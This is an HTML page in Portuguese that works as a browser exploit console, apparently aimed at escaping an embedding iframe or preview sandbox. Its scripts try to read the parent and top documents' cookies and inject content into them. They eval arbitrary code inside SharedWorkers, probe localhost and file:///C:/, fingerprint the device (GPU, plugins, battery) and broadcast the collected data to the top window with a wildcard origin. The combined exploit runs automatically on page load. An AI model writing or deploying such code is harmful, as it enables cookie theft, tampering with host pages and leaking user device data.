<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Exploração Avançada de Vulnerabilidades</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            max-width: 1000px;
            margin: 0 auto;
            padding: 20px;
            background-color: #f0f0f0;
            font-size: 12px; /* Reduzido para caber mais conteúdo */
        }
        h1, h2, h3 {
            color: #333;
            font-size: 16px; /* Reduzido para caber mais conteúdo */
            margin: 8px 0;
        }
        h1 {
            font-size: 18px;
        }
        .container {
            background-color: white;
            border-radius: 8px;
            padding: 10px;
            box-shadow: 0 2px 5px rgba(0,0,0,0.1);
            margin-bottom: 10px;
        }
        .result {
            margin-top: 5px;
            padding: 5px;
            border-radius: 4px;
            min-height: 30px;
            max-height: 150px;
            overflow-y: auto;
            background-color: #f9f9f9;
            border: 1px solid #ddd;
            white-space: pre-wrap;
            word-break: break-all;
            font-size: 11px; /* Reduzido para caber mais conteúdo */
        }
        .success {
            color: #d32f2f;
            font-weight: bold;
        }
        button {
            background-color: #d32f2f;
            color: white;
            border: none;
            padding: 5px 8px;
            border-radius: 4px;
            cursor: pointer;
            font-size: 11px;
            margin-top: 5px;
            margin-right: 5px;
        }
        button:hover {
            background-color: #b71c1c;
        }
        .nav-buttons {
            position: sticky;
            top: 0;
            background-color: #fff;
            padding: 5px 0;
            box-shadow: 0 2px 5px rgba(0,0,0,0.1);
            z-index: 100;
            display: flex;
            justify-content: space-between;
            margin-bottom: 10px;
            align-items: center;
        }
        .refresh-button {
            background-color: #333;
        }
        textarea {
            width: 100%;
            height: 60px;
            margin-top: 5px;
            padding: 4px;
            border-radius: 4px;
            border: 1px solid #ddd;
            font-family: monospace;
            font-size: 11px;
        }
        #data-collector {
            position: fixed;
            bottom: 0;
            left: 0;
            right: 0;
            background-color: #333;
            color: white;
            padding: 5px;
            z-index: 1000;
            max-height: 150px;
            overflow-y: auto;
            font-size: 11px;
        }
        #data-collector h3 {
            color: white;
            margin-top: 0;
            font-size: 14px;
        }
        .data-item {
            margin-bottom: 5px;
            padding: 3px;
            border-bottom: 1px solid #555;
        }
        iframe {
            width: 100%;
            height: 100px;
            border: 1px solid #ddd;
            margin-top: 5px;
        }
        .tabs {
            display: flex;
            margin-bottom: 5px;
        }
        .tab {
            padding: 5px 8px;
            background-color: #eee;
            cursor: pointer;
            border-radius: 4px 4px 0 0;
            margin-right: 3px;
            font-size: 11px;
        }
        .tab.active {
            background-color: #d32f2f;
            color: white;
        }
        .tab-content {
            display: none;
        }
        .tab-content.active {
            display: block;
        }
        /* Estilo para a notificação de vulnerabilidade */
        #exploit-notification {
            background-color: red;
            color: white;
            padding: 10px;
            position: fixed;
            top: 0;
            left: 0;
            right: 0;
            z-index: 9999;
            text-align: center;
            font-weight: bold;
            font-size: 16px;
        }
        /* Layout em colunas para melhor aproveitamento do espaço */
        .columns {
            display: flex;
            gap: 10px;
        }
        .column {
            flex: 1;
        }
    </style>
</head>
<body>
    <div class="nav-buttons">
        <h1>Exploração Avançada de Vulnerabilidades</h1>
        <button class="refresh-button" onclick="location.reload()">Atualizar Página</button>
    </div>

    <div class="columns">
        <div class="column">
            <div class="container">
                <h2>Painel de Controle</h2>
                <p>Esta página explora vulnerabilidades e extrai informações do sistema.</p>
                
                <div class="tabs">
                    <div class="tab active" onclick="showTab('dom-tab')">DOM</div>
                    <div class="tab" onclick="showTab('worker-tab')">Workers</div>
                    <div class="tab" onclick="showTab('code-tab')">Código</div>
                    <div class="tab" onclick="showTab('network-tab')">Rede</div>
                </div>
                
                <div id="dom-tab" class="tab-content active">
                    <h3>Exploração Avançada do DOM</h3>
                    <button onclick="extractDOMInfo()">Extrair Informações do DOM</button>
                    <button onclick="modifyDOM()">Tentar Modificar DOM Principal</button>
                    <div id="dom-result" class="result"></div>
                </div>
                
                <div id="worker-tab" class="tab-content">
                    <h3>Exploração Avançada de Shared Workers</h3>
                    <button onclick="createAdvancedSharedWorker()">Criar Shared Worker Avançado</button>
                    <button onclick="executeCodeInWorker()">Executar Código no Worker</button>
                    <textarea id="worker-code">// Código a ser executado no worker
try {
  // Tenta acessar o sistema de arquivos
  const result = self.location.toString();
  // Tenta acessar APIs restritas
  const hasProcess = typeof self.process !== 'undefined';
  const hasRequire = typeof self.require !== 'undefined';
  return { result, hasProcess, hasRequire };
} catch(e) {
  return 'Erro: ' + e.message;
}</textarea>
                    <div id="worker-result" class="result"></div>
                </div>
                
                <div id="code-tab" class="tab-content">
                    <h3>Execução de Código Avançado</h3>
                    <textarea id="custom-code">// Tenta acessar o domínio principal
try {
  const domain = window.top.document.domain;
  console.log('Domínio principal:', domain);
  
  // Tenta modificar o conteúdo do documento principal
  try {
    const mainDoc = window.top.document;
    const newElement = mainDoc.createElement('div');
    newElement.textContent = 'Conteúdo injetado via exploit';
    newElement.style.backgroundColor = 'red';
    newElement.style.color = 'white';
    newElement.style.padding = '10px';
    newElement.style.position = 'fixed';
    newElement.style.top = '10px';
    newElement.style.right = '10px';
    newElement.style.zIndex = '9999';
    mainDoc.body.appendChild(newElement);
    console.log('Elemento injetado com sucesso!');
  } catch(e) {
    console.log('Erro ao modificar documento principal:', e.message);
  }
  
  return 'Acesso ao domínio principal: ' + domain;
} catch(e) {
  console.log('Erro:', e.message);
  return 'Erro: ' + e.message;
}</textarea>
                    <button onclick="executeAdvancedCode()">Executar Código</button>
                    <div id="code-result" class="result"></div>
                </div>
                
                <div id="network-tab" class="tab-content">
                    <h3>Exploração de Rede</h3>
                    <button onclick="testLocalAccess()">Testar Acesso Local</button>
                    <button onclick="createIframeToMainDomain()">Criar Iframe para Domínio Principal</button>
                    <div id="iframe-container"></div>
                    <div id="network-result" class="result"></div>
                </div>
            </div>
        </div>
        
        <div class="column">
            <div class="container">
                <h2>Extração de Informações do Sistema</h2>
                <button onclick="extractSystemInfo()">Extrair Informações do Sistema</button>
                <button onclick="extractBrowserInfo()">Extrair Informações do Navegador</button>
                <div id="system-result" class="result"></div>
            </div>
            
            <div class="container">
                <h2>Exploração Combinada</h2>
                <button onclick="runCombinedExploit()">Executar Exploração Combinada</button>
                <div id="combined-result" class="result"></div>
            </div>
            
            <div class="container">
                <h2>Dados Coletados</h2>
                <div id="collected-data-inline" class="result"></div>
            </div>
        </div>
    </div>
    
    <div id="data-collector">
        <h3>Dados Coletados</h3>
        <div id="collected-data"></div>
    </div>

    <script>
        // Variáveis globais
        let sharedWorker = null;
        let collectedData = [];
        
        // Função para mostrar/esconder abas
        function showTab(tabId) {
            // Esconde todas as abas
            document.querySelectorAll('.tab-content').forEach(tab => {
                tab.classList.remove('active');
            });
            
            // Remove a classe active de todas as abas
            document.querySelectorAll('.tab').forEach(tab => {
                tab.classList.remove('active');
            });
            
            // Mostra a aba selecionada
            document.getElementById(tabId).classList.add('active');
            
            // Adiciona a classe active à aba clicada
            Array.from(document.querySelectorAll('.tab')).find(tab => {
                return tab.getAttribute('onclick').includes(tabId);
            }).classList.add('active');
        }
        
        // Função para adicionar dados coletados
        function addCollectedData(source, data) {
            const timestamp = new Date().toLocaleTimeString();
            const dataItem = {
                timestamp,
                source,
                data
            };
            
            collectedData.push(dataItem);
            updateDataCollector();
            
            // Tenta enviar os dados para o documento principal
            try {
                if (window.top !== window) {
                    window.top.postMessage({
                        type: 'exploitData',
                        data: dataItem
                    }, '*');
                }
            } catch(e) {
                console.log('Erro ao enviar dados para o documento principal:', e.message);
            }
        }
        
        // Função para atualizar o coletor de dados
        function updateDataCollector() {
            const dataCollector = document.getElementById('collected-data');
            const dataCollectorInline = document.getElementById('collected-data-inline');
            dataCollector.innerHTML = '';
            dataCollectorInline.innerHTML = '';
            
            collectedData.forEach(item => {
                const dataElement = document.createElement('div');
                dataElement.className = 'data-item';
                dataElement.innerHTML = `<strong>[${item.timestamp} - ${item.source}]</strong><br>${item.data}`;
                dataCollector.appendChild(dataElement);
                
                // Também adiciona ao coletor de dados inline
                const dataElementInline = document.createElement('div');
                dataElementInline.className = 'data-item';
                dataElementInline.innerHTML = `<strong>[${item.timestamp} - ${item.source}]</strong><br>${item.data}`;
                dataCollectorInline.appendChild(dataElementInline);
            });
        }
        
        // Função para exibir resultados
        function displayResult(elementId, message, isSuccess = false) {
            const resultElement = document.getElementById(elementId);
            resultElement.innerHTML = message;
            resultElement.className = isSuccess ? 'result success' : 'result';
            
            if (isSuccess) {
                addCollectedData(elementId, message);
            }
        }
        
        // Extração de informações do DOM
        function extractDOMInfo() {
            try {
                let results = [];
                
                // Informações básicas
                results.push(`URL atual: ${window.location.href}`);
                results.push(`Domínio atual: ${document.domain}`);
                results.push(`Referrer: ${document.referrer}`);
                
                // Tenta acessar o documento pai
                try {
                    const parentDomain = window.parent.document.domain;
                    results.push(`Domínio pai: ${parentDomain}`);
                    
                    // Tenta listar elementos do documento pai
                    try {
                        const parentElements = window.parent.document.querySelectorAll('*').length;
                        results.push(`Número de elementos no documento pai: ${parentElements}`);
                        
                        // Tenta obter o título do documento pai
                        const parentTitle = window.parent.document.title;
                        results.push(`Título do documento pai: ${parentTitle}`);
                        
                        // Tenta obter cookies do documento pai
                        const parentCookies = window.parent.document.cookie;
                        results.push(`Cookies do documento pai: ${parentCookies || 'Nenhum'}`);
                        
                        displayResult('dom-result', results.join('\n'), true);
                        return;
                    } catch(e) {
                        results.push(`Erro ao acessar elementos do documento pai: ${e.message}`);
                    }
                } catch(e) {
                    results.push(`Erro ao acessar domínio pai: ${e.message}`);
                }
                
                // Tenta acessar o documento principal
                try {
                    const topDomain = window.top.document.domain;
                    results.push(`Domínio principal: ${topDomain}`);
                    
                    // Tenta listar elementos do documento principal
                    try {
                        const topElements = window.top.document.querySelectorAll('*').length;
                        results.push(`Número de elementos no documento principal: ${topElements}`);
                        
                        // Tenta obter o título do documento principal
                        const topTitle = window.top.document.title;
                        results.push(`Título do documento principal: ${topTitle}`);
                        
                        // Tenta obter cookies do documento principal
                        const topCookies = window.top.document.cookie;
                        results.push(`Cookies do documento principal: ${topCookies || 'Nenhum'}`);
                        
                        displayResult('dom-result', results.join('\n'), true);
                        return;
                    } catch(e) {
                        results.push(`Erro ao acessar elementos do documento principal: ${e.message}`);
                    }
                } catch(e) {
                    results.push(`Erro ao acessar domínio principal: ${e.message}`);
                }
                
                displayResult('dom-result', results.join('\n'));
            } catch(e) {
                displayResult('dom-result', `Erro geral: ${e.message}`);
            }
        }
        
        // Tentativa de modificar o DOM principal
        function modifyDOM() {
            try {
                let results = [];
                
                // Tenta modificar o documento atual
                const testDiv = document.createElement('div');
                testDiv.textContent = 'Teste de modificação do DOM';
                testDiv.style.backgroundColor = 'green';
                testDiv.style.color = 'white';
                testDiv.style.padding = '10px';
                document.body.appendChild(testDiv);
                results.push('Documento atual modificado com sucesso.');
                
                // Tenta modificar o documento pai
                try {
                    const parentDoc = window.parent.document;
                    const parentDiv = parentDoc.createElement('div');
                    parentDiv.textContent = 'Conteúdo injetado no documento pai';
                    parentDiv.style.backgroundColor = 'red';
                    parentDiv.style.color = 'white';
                    parentDiv.style.padding = '10px';
                    parentDiv.style.position = 'fixed';
                    parentDiv.style.top = '10px';
                    parentDiv.style.right = '10px';
                    parentDiv.style.zIndex = '9999';
                    parentDoc.body.appendChild(parentDiv);
                    results.push('Documento pai modificado com sucesso!');
                    displayResult('dom-result', results.join('\n'), true);
                    return;
                } catch(e) {
                    results.push(`Erro ao modificar documento pai: ${e.message}`);
                }
                
                // Tenta modificar o documento principal
                try {
                    const topDoc = window.top.document;
                    const topDiv = topDoc.createElement('div');
                    topDiv.textContent = 'Conteúdo injetado no documento principal';
                    topDiv.style.backgroundColor = 'red';
                    topDiv.style.color = 'white';
                    topDiv.style.padding = '10px';
                    topDiv.style.position = 'fixed';
                    topDiv.style.top = '10px';
                    topDiv.style.right = '10px';
                    topDiv.style.zIndex = '9999';
                    topDoc.body.appendChild(topDiv);
                    results.push('Documento principal modificado com sucesso!');
                    displayResult('dom-result', results.join('\n'), true);
                    return;
                } catch(e) {
                    results.push(`Erro ao modificar documento principal: ${e.message}`);
                }
                
                displayResult('dom-result', results.join('\n'));
            } catch(e) {
                displayResult('dom-result', `Erro geral: ${e.message}`);
            }
        }
        
        // Criação de Shared Worker avançado
        function createAdvancedSharedWorker() {
            try {
                let results = [];
                
                // Verifica se os Shared Workers estão disponíveis
                if (typeof SharedWorker === 'undefined') {
                    results.push('Shared Workers não estão disponíveis neste navegador.');
                    displayResult('worker-result', results.join('\n'));
                    return;
                }
                
                results.push('Shared Workers estão disponíveis!');
                
                // Código para o Shared Worker
                const workerCode = `
                    // Código do Shared Worker Avançado
                    let systemInfo = {};
                    let exploitAttempts = [];
                    
                    // Tenta coletar informações do sistema
                    try {
                        systemInfo.userAgent = self.navigator ? self.navigator.userAgent : 'N/A';
                        systemInfo.platform = self.navigator ? self.navigator.platform : 'N/A';
                        systemInfo.language = self.navigator ? self.navigator.language : 'N/A';
                        systemInfo.hardwareConcurrency = self.navigator ? self.navigator.hardwareConcurrency : 'N/A';
                        systemInfo.memory = self.performance ? JSON.stringify(self.performance.memory) : 'N/A';
                        systemInfo.location = self.location ? self.location.toString() : 'N/A';
                    } catch(e) {
                        systemInfo.error = e.message;
                    }
                    
                    // Tenta acessar APIs restritas
                    try {
                        systemInfo.hasProcess = typeof self.process !== 'undefined';
                        systemInfo.hasRequire = typeof self.require !== 'undefined';
                        systemInfo.hasChrome = typeof self.chrome !== 'undefined';
                        systemInfo.hasNode = typeof self.global !== 'undefined';
                        systemInfo.hasWindow = typeof self.window !== 'undefined';
                        systemInfo.hasDocument = typeof self.document !== 'undefined';
                    } catch(e) {
                        systemInfo.restrictedError = e.message;
                    }
                    
                    // Tenta acessar o sistema de arquivos (se disponível)
                    try {
                        if (typeof self.FileSystem !== 'undefined') {
                            systemInfo.hasFileSystem = true;
                        } else if (typeof self.requestFileSystem !== 'undefined') {
                            systemInfo.hasRequestFileSystem = true;
                        } else {
                            systemInfo.hasFileSystem = false;
                        }
                    } catch(e) {
                        systemInfo.fileSystemError = e.message;
                    }
                    
                    // Manipulador de conexão
                    self.onconnect = function(e) {
                        const port = e.ports[0];
                        
                        port.onmessage = function(event) {
                            if (event.data === 'getInfo') {
                                port.postMessage({
                                    type: 'systemInfo',
                                    data: systemInfo
                                });
                            }
                            
                            // Executa código enviado pelo cliente
                            if (event.data.type === 'eval') {
                                try {
                                    // Registra a tentativa de exploit
                                    exploitAttempts.push({
                                        timestamp: new Date().toString(),
                                        code: event.data.code
                                    });
                                    
                                    // Executa o código
                                    const result = eval(event.data.code);
                                    port.postMessage({
                                        type: 'evalResult',
                                        success: true,
                                        result: result
                                    });
                                } catch(e) {
                                    port.postMessage({
                                        type: 'evalResult',
                                        success: false,
                                        error: e.message
                                    });
                                }
                            }
                            
                            // Retorna o histórico de tentativas de exploit
                            if (event.data === 'getExploitHistory') {
                                port.postMessage({
                                    type: 'exploitHistory',
                                    data: exploitAttempts
                                });
                            }
                        };
                        
                        // Envia mensagem inicial
                        port.postMessage({
                            type: 'connected',
                            timestamp: new Date().toString()
                        });
                        
                        port.start();
                    };
                `;
                
                // Cria um Blob com o código do worker
                const blob = new Blob([workerCode], { type: 'application/javascript' });
                const workerUrl = URL.createObjectURL(blob);
                
                // Alternativa usando data URL diretamente
                const dataUrl = 'data:application/javascript,' + encodeURIComponent(workerCode);
                
                // Tenta criar o worker usando o Blob URL
                try {
                    results.push('Tentando criar Shared Worker usando Blob URL...');
                    sharedWorker = new SharedWorker(workerUrl);
                    setupAdvancedWorkerCommunication(sharedWorker, results);
                } catch (e) {
                    results.push(`Erro ao criar Shared Worker com Blob URL: ${e.message}`);
                    
                    // Tenta criar o worker usando data URL
                    try {
                        results.push('Tentando criar Shared Worker usando data URL...');
                        sharedWorker = new SharedWorker(dataUrl);
                        setupAdvancedWorkerCommunication(sharedWorker, results);
                    } catch (e) {
                        results.push(`Erro ao criar Shared Worker com data URL: ${e.message}`);
                        displayResult('worker-result', results.join('\n'));
                    }
                }
            } catch (e) {
                displayResult('worker-result', `Erro geral: ${e.message}`);
            }
        }
        
        // Configuração da comunicação com o worker avançado
        function setupAdvancedWorkerCommunication(worker, results) {
            worker.port.onmessage = function(e) {
                if (e.data.type === 'connected') {
                    results.push(`Worker conectado em: ${e.data.timestamp}`);
                    worker.port.postMessage('getInfo');
                }
                
                if (e.data.type === 'systemInfo') {
                    results.push('Informações do sistema obtidas do worker:');
                    for (const [key, value] of Object.entries(e.data.data)) {
                        results.push(`- ${key}: ${JSON.stringify(value)}`);
                    }
                    
                    displayResult('worker-result', results.join('\n'), true);
                }
                
                if (e.data.type === 'evalResult') {
                    if (e.data.success) {
                        results.push(`Execução de código no worker bem-sucedida:`);
                        results.push(JSON.stringify(e.data.result, null, 2));
                    } else {
                        results.push(`Erro na execução de código no worker: ${e.data.error}`);
                    }
                    
                    displayResult('worker-result', results.join('\n'), e.data.success);
                }
                
                if (e.data.type === 'exploitHistory') {
                    results.push('Histórico de tentativas de exploit:');
                    e.data.data.forEach((attempt, index) => {
                        results.push(`[${index + 1}] ${attempt.timestamp}: ${attempt.code}`);
                    });
                    
                    displayResult('worker-result', results.join('\n'));
                }
            };
            
            worker.port.onerror = function(error) {
                results.push(`Erro no worker: ${error.message}`);
                displayResult('worker-result', results.join('\n'));
            };
            
            worker.port.start();
        }
        
        // Execução de código no worker
        function executeCodeInWorker() {
            if (!sharedWorker) {
                displayResult('worker-result', 'Nenhum Shared Worker criado. Crie um worker primeiro.');
                return;
            }
            
            const code = document.getElementById('worker-code').value;
            
            sharedWorker.port.postMessage({
                type: 'eval',
                code: code
            });
        }
        
        // Execução de código avançado
        function executeAdvancedCode() {
            try {
                const code = document.getElementById('custom-code').value;
                let results = [];
                
                results.push('Executando código personalizado:');
                results.push(`\n${code}\n`);
                
                // Captura console.log
                const originalConsoleLog = console.log;
                const logs = [];
                
                console.log = function() {
                    logs.push(Array.from(arguments).join(' '));
                    originalConsoleLog.apply(console, arguments);
                };
                
                // Executa o código
                try {
                    const result = eval(code);
                    results.push('Resultado:');
                    results.push(result !== undefined ? result.toString() : 'undefined');
                    
                    if (logs.length > 0) {
                        results.push('\nLogs:');
                        logs.forEach(log => results.push(log));
                    }
                    
                    // Verifica se o código conseguiu acessar algo privilegiado
                    if (result && typeof result === 'string' && result.includes('Acesso ao domínio principal')) {
                        displayResult('code-result', results.join('\n'), true);
                    } else {
                        displayResult('code-result', results.join('\n'));
                    }
                } catch (e) {
                    results.push(`Erro: ${e.message}`);
                    displayResult('code-result', results.join('\n'));
                }
                
                // Restaura console.log
                console.log = originalConsoleLog;
            } catch (e) {
                displayResult('code-result', `Erro geral: ${e.message}`);
            }
        }
        
        // Teste de acesso local
        function testLocalAccess() {
            try {
                let results = [];
                
                // Tenta acessar localhost via fetch
                results.push('Tentando acessar recursos locais...');
                
                // Tenta acessar localhost
                fetch('http://localhost:8000/')
                    .then(response => response.text())
                    .then(text => {
                        results.push('VULNERABILIDADE: Acesso a localhost bem-sucedido!');
                        results.push(`Conteúdo: ${text.substring(0, 100)}...`);
                        displayResult('network-result', results.join('\n'), true);
                    })
                    .catch(error => {
                        results.push(`Erro ao acessar localhost: ${error.message}`);
                        
                        // Tenta acessar file://
                        try {
                            fetch('file:///C:/')
                                .then(response => response.text())
                                .then(text => {
                                    results.push('VULNERABILIDADE: Acesso ao sistema de arquivos bem-sucedido!');
                                    results.push(`Conteúdo: ${text.substring(0, 100)}...`);
                                    displayResult('network-result', results.join('\n'), true);
                                })
                                .catch(error => {
                                    results.push(`Erro ao acessar sistema de arquivos: ${error.message}`);
                                    displayResult('network-result', results.join('\n'));
                                });
                        } catch (e) {
                            results.push(`Erro ao tentar acessar sistema de arquivos: ${e.message}`);
                            displayResult('network-result', results.join('\n'));
                        }
                    });
            } catch (e) {
                displayResult('network-result', `Erro geral: ${e.message}`);
            }
        }
        
        // Criação de iframe para o domínio principal
        function createIframeToMainDomain() {
            try {
                let results = [];
                
                // Obtém o domínio principal
                let mainDomain = '';
                try {
                    mainDomain = window.top.document.domain;
                    results.push(`Domínio principal: ${mainDomain}`);
                } catch (e) {
                    results.push(`Erro ao obter domínio principal: ${e.message}`);
                    mainDomain = document.domain;
                }
                
                // Cria um iframe
                const iframeContainer = document.getElementById('iframe-container');
                iframeContainer.innerHTML = '';
                
                const iframe = document.createElement('iframe');
                iframe.src = `https://${mainDomain}`;
                iframe.id = 'main-domain-iframe';
                iframeContainer.appendChild(iframe);
                
                results.push(`Iframe para ${mainDomain} criado.`);
                
                // Tenta acessar o conteúdo do iframe
                setTimeout(() => {
                    try {
                        const iframeDoc = iframe.contentDocument || iframe.contentWindow.document;
                        results.push('VULNERABILIDADE: Conseguiu acessar documento do iframe!');
                        results.push(`Título: ${iframeDoc.title}`);
                        results.push(`Número de elementos: ${iframeDoc.querySelectorAll('*').length}`);
                        displayResult('network-result', results.join('\n'), true);
                    } catch (e) {
                        results.push(`Erro ao acessar conteúdo do iframe: ${e.message}`);
                        displayResult('network-result', results.join('\n'));
                    }
                }, 1000);
            } catch (e) {
                displayResult('network-result', `Erro geral: ${e.message}`);
            }
        }
        
        // Extração de informações do sistema
        function extractSystemInfo() {
            try {
                let results = [];
                
                // Informações do navegador
                results.push('Informações do navegador:');
                results.push(`User Agent: ${navigator.userAgent}`);
                results.push(`Plataforma: ${navigator.platform}`);
                results.push(`Linguagem: ${navigator.language}`);
                results.push(`Cookies habilitados: ${navigator.cookieEnabled}`);
                results.push(`Núcleos de CPU: ${navigator.hardwareConcurrency}`);
                results.push(`Memória: ${performance.memory ? JSON.stringify(performance.memory) : 'N/A'}`);
                
                // Tenta acessar informações mais sensíveis
                try {
                    results.push('\nTentando acessar informações sensíveis:');
                    
                    // Verifica se o navegador está em modo de navegação privada
                    try {
                        const isIncognito = !window.indexedDB;
                        results.push(`Modo de navegação privada: ${isIncognito}`);
                    } catch (e) {
                        results.push(`Erro ao verificar modo de navegação privada: ${e.message}`);
                    }
                    
                    // Tenta acessar a bateria
                    if (navigator.getBattery) {
                        navigator.getBattery().then(battery => {
                            results.push(`Nível de bateria: ${battery.level * 100}%`);
                            results.push(`Bateria carregando: ${battery.charging}`);
                            displayResult('system-result', results.join('\n'));
                        });
                    } else {
                        results.push('API de Bateria não disponível.');
                    }
                    
                    // Tenta acessar a geolocalização
                    if (navigator.geolocation) {
                        results.push('API de Geolocalização disponível.');
                    } else {
                        results.push('API de Geolocalização não disponível.');
                    }
                    
                } catch (e) {
                    results.push(`Erro ao acessar informações sensíveis: ${e.message}`);
                }
                
                displayResult('system-result', results.join('\n'));
            } catch (e) {
                displayResult('system-result', `Erro geral: ${e.message}`);
            }
        }
        
        // Extração de informações do navegador
        function extractBrowserInfo() {
            try {
                let results = [];
                
                // Plugins e extensões
                results.push('Plugins instalados:');
                if (navigator.plugins) {
                    if (navigator.plugins.length === 0) {
                        results.push('Nenhum plugin encontrado.');
                    } else {
                        for (let i = 0; i < navigator.plugins.length; i++) {
                            const plugin = navigator.plugins[i];
                            results.push(`- ${plugin.name} (${plugin.filename})`);
                        }
                    }
                } else {
                    results.push('Informações de plugins não disponíveis.');
                }
                
                // Recursos do navegador
                results.push('\nRecursos do navegador:');
                const features = [
                    'Bluetooth', 'USB', 'Serial', 'HID', 'WebGL', 'WebRTC', 'Gamepad',
                    'Payment', 'PictureInPicture', 'Presentation', 'RemotePlayback',
                    'ScreenOrientation', 'Sensor', 'VirtualKeyboard', 'WebShare'
                ];
                
                features.forEach(feature => {
                    const hasFeature = feature.toLowerCase() in navigator || 
                                      'get' + feature in navigator || 
                                      'request' + feature in navigator;
                    results.push(`- ${feature}: ${hasFeature ? 'Disponível' : 'Não disponível'}`);
                });
                
                // Verifica suporte a WebGL
                try {
                    const canvas = document.createElement('canvas');
                    const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
                    
                    if (gl) {
                        const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
                        if (debugInfo) {
                            const vendor = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL);
                            const renderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
                            results.push(`\nInformações da GPU:`);
                            results.push(`- Fabricante: ${vendor}`);
                            results.push(`- Renderizador: ${renderer}`);
                        }
                    }
                } catch (e) {
                    results.push(`Erro ao acessar informações de WebGL: ${e.message}`);
                }
                
                displayResult('system-result', results.join('\n'));
            } catch (e) {
                displayResult('system-result', `Erro geral: ${e.message}`);
            }
        }
        
        // Exploração combinada
        function runCombinedExploit() {
            try {
                let results = [];
                results.push('Iniciando exploração combinada...');
                
                // Tenta acessar o DOM principal
                try {
                    const topDomain = window.top.document.domain;
                    results.push(`Domínio principal: ${topDomain}`);
                    
                    // Se conseguiu acessar o DOM principal, tenta modificá-lo
                    try {
                        const topDoc = window.top.document;
                        const exploitDiv = topDoc.createElement('div');
                        exploitDiv.id = 'exploit-notification';
                        exploitDiv.textContent = 'VULNERABILIDADE EXPLORADA COM SUCESSO!';
                        exploitDiv.style.backgroundColor = 'red';
                        exploitDiv.style.color = 'white';
                        exploitDiv.style.padding = '10px';
                        exploitDiv.style.position = 'fixed';
                        exploitDiv.style.top = '0';
                        exploitDiv.style.left = '0';
                        exploitDiv.style.right = '0';
                        exploitDiv.style.zIndex = '9999';
                        exploitDiv.style.textAlign = 'center';
                        exploitDiv.style.fontWeight = 'bold';
                        exploitDiv.style.fontSize = '16px';
                        
                        topDoc.body.appendChild(exploitDiv);
                        results.push('DOM principal modificado com sucesso!');
                    } catch (e) {
                        results.push(`Erro ao modificar DOM principal: ${e.message}`);
                    }
                } catch (e) {
                    results.push(`Erro ao acessar DOM principal: ${e.message}`);
                }
                
                // Cria um Shared Worker para tentar acessar recursos do sistema
                if (typeof SharedWorker !== 'undefined') {
                    // Código para o Shared Worker
                    const workerCode = `
                        self.onconnect = function(e) {
                            const port = e.ports[0];
                            
                            port.onmessage = function(event) {
                                if (event.data === 'exploit') {
                                    // Tenta acessar recursos do sistema
                                    const systemInfo = {};
                                    
                                    try {
                                        systemInfo.location = self.location.toString();
                                        systemInfo.userAgent = self.navigator ? self.navigator.userAgent : 'N/A';
                                    } catch(e) {
                                        systemInfo.error = e.message;
                                    }
                                    
                                    port.postMessage({
                                        type: 'exploitResult',
                                        data: systemInfo
                                    });
                                }
                            };
                            
                            port.start();
                        };
                    `;
                    
                    // Cria um Blob com o código do worker
                    const blob = new Blob([workerCode], { type: 'application/javascript' });
                    const workerUrl = URL.createObjectURL(blob);
                    
                    // Alternativa usando data URL diretamente
                    const dataUrl = 'data:application/javascript,' + encodeURIComponent(workerCode);
                    
                    // Tenta criar o worker
                    try {
                        const worker = new SharedWorker(dataUrl);
                        worker.port.onmessage = function(e) {
                            if (e.data.type === 'exploitResult') {
                                results.push('Resultados do Shared Worker:');
                                for (const [key, value] of Object.entries(e.data.data)) {
                                    results.push(`- ${key}: ${value}`);
                                }
                                
                                displayResult('combined-result', results.join('\n'), true);
                            }
                        };
                        
                        worker.port.start();
                        worker.port.postMessage('exploit');
                        
                        results.push('Shared Worker criado com sucesso.');
                    } catch (e) {
                        results.push(`Erro ao criar Shared Worker: ${e.message}`);
                        displayResult('combined-result', results.join('\n'));
                    }
                } else {
                    results.push('Shared Workers não estão disponíveis neste navegador.');
                    displayResult('combined-result', results.join('\n'));
                }
            } catch (e) {
                displayResult('combined-result', `Erro geral: ${e.message}`);
            }
        }
        
        // Listener para mensagens de outros documentos
        window.addEventListener('message', function(event) {
            if (event.data && event.data.type === 'exploitData') {
                addCollectedData('external', `Dados recebidos de ${event.origin}: ${JSON.stringify(event.data.data)}`);
            }
        });
        
        // Executa a exploração combinada automaticamente ao carregar a página
        window.addEventListener('load', function() {
            setTimeout(runCombinedExploit, 500);
        });
    </script>
</body>
</html>
